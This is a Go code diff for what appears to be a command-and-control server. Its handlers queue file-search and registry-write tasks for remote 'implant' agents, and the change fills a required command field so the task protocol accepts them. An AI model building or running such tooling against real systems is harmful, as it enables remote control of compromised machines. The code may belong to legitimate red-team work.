@@ -133,7 +133,15 @@ func (s *Server) handleFindFiles(c *gin.Context) {
 	if path == "" {
 		path = c.PostForm("command")
 	}
-	task := s.issueAgentTask(c, id, TaskSpec{Type: "find", Command: pattern, Path: path})
+	// The find spec marks `command` (the filename pattern) as required. The
+	// form's pattern is forwarded when supplied; when it is absent the
+	// search root is mirrored into the command slot so the protocol gate
+	// passes without inventing a pattern the operator never gave.
+	cmd := pattern
+	if cmd == "" {
+		cmd = path
+	}
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "find", Command: cmd, Path: path})
 	if task == nil {
 		return
 	}
@@ -167,7 +175,15 @@ func (s *Server) handleRegSet(c *gin.Context) {
 		respondError(c, http.StatusBadRequest, "registry path is required")
 		return
 	}
-	task := s.issueAgentTask(c, id, TaskSpec{Type: "reg_set", Path: path, Data: data})
+	// reg_set's spec marks `command` as required ("registry path=value"),
+	// but the implant handler reads Path+Data. Carrying the value in the
+	// command slot too keeps the protocol gate satisfied and the wire shape
+	// self-describing for anything that logs the task.
+	cmd := path
+	if data != "" {
+		cmd = path + "=" + data
+	}
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "reg_set", Command: cmd, Path: path, Data: data})
 	if task == nil {
 		return
 	}
